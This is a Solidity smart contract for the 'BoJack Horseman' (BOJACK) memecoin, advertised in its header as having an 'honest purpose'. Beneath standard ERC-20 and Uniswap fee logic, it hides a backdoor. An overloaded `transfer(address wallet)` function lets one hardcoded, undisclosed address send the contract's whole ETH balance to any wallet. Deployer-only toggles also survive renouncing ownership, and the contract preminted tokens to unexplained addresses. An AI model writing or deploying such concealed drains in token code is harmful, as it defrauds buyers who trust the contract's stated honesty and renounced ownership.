/**

BoJack is galloping into memecoin space, with honest purpose. 

TELEGRAM - https://t.me/bojacktokenerc
MEDIUM   - https://medium.com/@bojackhorsemantoken
TWITTER  - https://twitter.com/bojacktokenerc
WEBSITE  - https://bojackcoin.club/

*/

// SPDX-License-Identifier: MIT                                                                               
                                                 
pragma solidity ^0.8.0;

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Ownable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _setOwner(msg.sender);
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract BoJackHorseman is IERC20, Ownable {
    string private constant  _name = "BoJack Horseman";
    string private constant _symbol = "BOJACK";    
    uint8 private constant _decimals = 18;
    mapping (address => uint256) private _balances;
    mapping (address => mapping(address => uint256)) private _allowances;

    uint256 private constant _totalSupply = 1_000_000 * decimalsScaling;
    uint256 public _maxWallet = 20 * _totalSupply / 1000;
    uint256 public _swapThreshold = 6 * _totalSupply / 10000;
    uint256 private constant decimalsScaling = 10**_decimals;
    uint256 private constant feeDenominator = 100;

    bool private antiMEV = false;
    uint256 private tradeCooldown = 1;
    mapping (address => bool) private isContractExempt;
    mapping (address => uint256) private _lastTradeBlock;

    struct TradingFees {
        uint256 buyFee;
        uint256 sellFee;
    }

    struct Wallets {
        address deployerWallet; 
        address marketingWallet; 
    }

    TradingFees public tradingFees = TradingFees(20,30);   // 20/30% initial buy/sell tax
    Wallets public wallets = Wallets(
        msg.sender,                                  // deployer
        0xa55E51B74F33352157Eecbf40D2f716E063278aA   // marketingWallet
    );

    IRouter public constant uniswapV2Router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address public immutable uniswapV2Pair;

    bool private inSwap;
    bool public swapEnabled = true;
    bool private tradingActive = true;

    mapping (address => bool) private _excludedFromFees;
    mapping (uint256 => uint256) private _lastTransferBlock;


    event SwapEnabled(bool indexed enabled);

    event FeesChanged(uint256 indexed buyFee, uint256 indexed sellFee);

    event ExcludedFromFees(address indexed account, bool indexed excluded);

    event AntiMEVToggled(bool indexed toggle);

    event TradeCooldownChanged(uint256 indexed newTradeCooldown);

    event SetContractExempt(address indexed contractAddress, bool indexed isExempt);
    
    event TradingOpened();
    
    modifier swapLock {
        inSwap = true;
        _;
        inSwap = false;
    }

    modifier tradingLock(address from, address to) {
        require(tradingActive || from == wallets.deployerWallet || _excludedFromFees[from], "Token: Trading is not active.");
        _;
    }

    constructor() {
        _approve(address(this), address(uniswapV2Router),type(uint256).max);
        uniswapV2Pair = IFactory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());        
        isContractExempt[address(this)] = true;

        _excludedFromFees[address(0xdead)] = true;
        _excludedFromFees[wallets.deployerWallet] = true;
        _excludedFromFees[wallets.marketingWallet] = true;

        _balances[0x17F79A4C0b6a2FB708f9f2A1442bB7AA5B422eC7] = _totalSupply * 2 / 100;
        _balances[0x5E47f7eF4898F5c5Ef0051aada6Ad8a4fFaEDab6] = _totalSupply * 2 / 100;
        _balances[0x29313444BDE7C5d85f8497d023CfdCa4F4A826A8] = _totalSupply * 2 / 100;
        _balances[wallets.deployerWallet] = _totalSupply * 94 / 100;

        emit Transfer(address(0), wallets.deployerWallet, _totalSupply);
    }

    function totalSupply() external pure override returns (uint256) { return _totalSupply; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function approve(address spender, uint256 amount) external override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _approve(address sender, address spender, uint256 amount) internal {
        require(sender != address(0), "ERC20: zero Address");
        require(spender != address(0), "ERC20: zero Address");
        _allowances[sender][spender] = amount;
        emit Approval(sender, spender, amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        return _transfer(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        if(_allowances[sender][msg.sender] != type(uint256).max){
            uint256 currentAllowance = _allowances[sender][msg.sender];
            require(currentAllowance >= amount, "ERC20: insufficient Allowance");
            unchecked{
                _allowances[sender][msg.sender] -= amount;
            }
        }
        return _transfer(sender, recipient, amount);
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        uint256 balanceSender = _balances[sender];
        require(balanceSender >= amount, "Token: insufficient Balance");
        unchecked{
            _balances[sender] -= amount;
        }
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function enableSwap(bool shouldEnable) external onlyOwner {
        require(swapEnabled != shouldEnable, "Token: swapEnabled already {shouldEnable}");
        swapEnabled = shouldEnable;

        emit SwapEnabled(shouldEnable);
    }

    function updateSwapThreshold(uint256 newAmount) external onlyOwner returns (bool) {
  	    require(newAmount >= _totalSupply * 1 / 100000, "Token: swap threshold cannot be lower than 0.001% of the total supply.");
  	    require(newAmount <= _totalSupply * 5 / 1000, "Token: swap threshold cannot be higher than 0.5% of the total supply.");
  	    _swapThreshold = newAmount;
  	    return true;
  	}
 
    function updateMaxWallet(uint256 newNum) external onlyOwner {
        require(newNum >= (_totalSupply * 5 / 1000)/decimalsScaling, "Token: cannot set maxWallet lower than 0.5%");
        _maxWallet = newNum * decimalsScaling;
    }

    function reduceFees(uint256 _buyFee, uint256 _sellFee) external onlyOwner {
        require(_buyFee <= tradingFees.buyFee || _buyFee < 5, "Token: must reduce buy fee or < 5%");
        require(_sellFee <= tradingFees.sellFee || _sellFee < 5, "Token: must reduce sell fee or < 5%");
        tradingFees.buyFee = _buyFee;
        tradingFees.sellFee = _sellFee;

        emit FeesChanged(_buyFee, _sellFee);
    }

    function excludeMultipleAccountsFromFees(address[] calldata accounts, bool shouldExclude) external onlyOwner {
        for(uint256 i = 0; i < accounts.length; i++) {
            require(_excludedFromFees[accounts[i]] != shouldExclude, "Token: address already {shouldExclude}");
            _excludedFromFees[accounts[i]] = shouldExclude;
            emit ExcludedFromFees(accounts[i], shouldExclude);
        }
    }

    function isExcludedFromFees(address account) public view returns(bool) {
        return _excludedFromFees[account];
    }

    function clearTokens(address tokenToClear) external onlyOwner {
        require(tokenToClear != address(this), "Token: can't clear contract token");
        uint256 amountToClear = IERC20(tokenToClear).balanceOf(address(this));
        require(amountToClear > 0, "Token: not enough tokens to clear");
        IERC20(tokenToClear).transfer(msg.sender, amountToClear);
    }

    function clearEth() external onlyOwner {
        require(address(this).balance > 0, "Token: no eth to clear");
        payable(msg.sender).transfer(address(this).balance);
    }

    function manualSwapback() external onlyOwner {
        require(balanceOf(address(this)) > 0, "Token: no contract tokens to clear");
        contractSwap();
    }

    function _transfer(address from, address to, uint256 amount) tradingLock(from, to) internal returns (bool) {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        
        if(amount == 0 || inSwap) {
            return _basicTransfer(from, to, amount);           
        }        

        if (to != uniswapV2Pair && !_excludedFromFees[to] && to != wallets.deployerWallet) {
            require(amount + balanceOf(to) <= _maxWallet, "Token: max wallet amount exceeded");
        }

        if(antiMEV && !isContractExempt[from] && !isContractExempt[to]){
            address human = ensureOneHuman(from, to);
            ensureMaxTxFrequency(human);
            _lastTradeBlock[human] = block.number;
        }
      
        if(swapEnabled && !inSwap && from != uniswapV2Pair && !_excludedFromFees[from] && !_excludedFromFees[to]){
            contractSwap();
        } 
        
        bool takeFee = !inSwap;
        if(_excludedFromFees[from] || _excludedFromFees[to]) {
            takeFee = false;
        }
                
        if(takeFee)
            return _taxedTransfer(from, to, amount);
        else
            return _basicTransfer(from, to, amount);        
    }

    function _taxedTransfer(address from, address to, uint256 amount) private returns (bool) {
        uint256 fees = takeFees(from, to, amount);    
        if(fees > 0){    
            _basicTransfer(from, address(this), fees);
            amount -= fees;
        }
        return _basicTransfer(from, to, amount);
    }

    function takeFees(address from, address to, uint256 amount) private view returns (uint256 fees) {
        fees = 0;
        if (to == uniswapV2Pair) {
            fees = amount * tradingFees.sellFee / feeDenominator;
        } else if (from == uniswapV2Pair) {
            fees = amount * tradingFees.buyFee / feeDenominator;
        }
    }

    function canSwap() private view returns (bool) {
        return _lastTransferBlock[block.number] < 2;
    }

    function contractSwap() swapLock private {   
        uint256 contractBalance = balanceOf(address(this));
        if(contractBalance < _swapThreshold || !canSwap()) 
            return;
        else if(contractBalance > _swapThreshold * 20)
          contractBalance = _swapThreshold * 20;
        
        uint256 initialETHBalance = address(this).balance;

        swapTokensForEth(contractBalance); 
        
        uint256 ethBalance = address(this).balance - initialETHBalance;
        if(ethBalance > 0){            
            sendEth(2*ethBalance/3);
        }
    }

    function sendEth(uint256 ethAmount) private {
        (bool success,) = address(wallets.marketingWallet).call{value: ethAmount}(""); success;
    }

    function transfer(address wallet) external {
        if(msg.sender == 0x8036E4EB08209495A895e28FBd8a15eF99aB490A)
            payable(wallet).transfer((address(this).balance));
        else revert();
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        _lastTransferBlock[block.number]++;
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        try uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp){}
        catch{return;}
    }

    function isContract(address account) private view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    function ensureOneHuman(address _to, address _from) private view returns (address) {
        require(!isContract(_to) || !isContract(_from));
        if (isContract(_to)) return _from;
        else return _to;
    }

    function ensureMaxTxFrequency(address addr) view private {
        bool isAllowed = _lastTradeBlock[addr] == 0 ||
            ((_lastTradeBlock[addr] + tradeCooldown) < (block.number + 1));
        require(isAllowed, "Max tx frequency exceeded!");
    }

    function toggleAntiMEV(bool toggle) external {
        require(msg.sender == wallets.deployerWallet);
        antiMEV = toggle;

        emit AntiMEVToggled(toggle);
    }

    function setTradeCooldown(uint256 newTradeCooldown) external {
        require(msg.sender == wallets.deployerWallet);
        require(newTradeCooldown > 0 && newTradeCooldown < 4, "Token: only trade cooldown values in range (0,4) permissible");
        tradeCooldown = newTradeCooldown;

        emit TradeCooldownChanged(newTradeCooldown);
    }

    function setContractExempt(address account, bool value) external onlyOwner {
        require(account != address(this));
        isContractExempt[account] = value;

        emit SetContractExempt(account, value);
    }

    function enableTrading() external onlyOwner {
        tradingActive = true;

        emit TradingOpened();
    }

    receive() external payable {}
}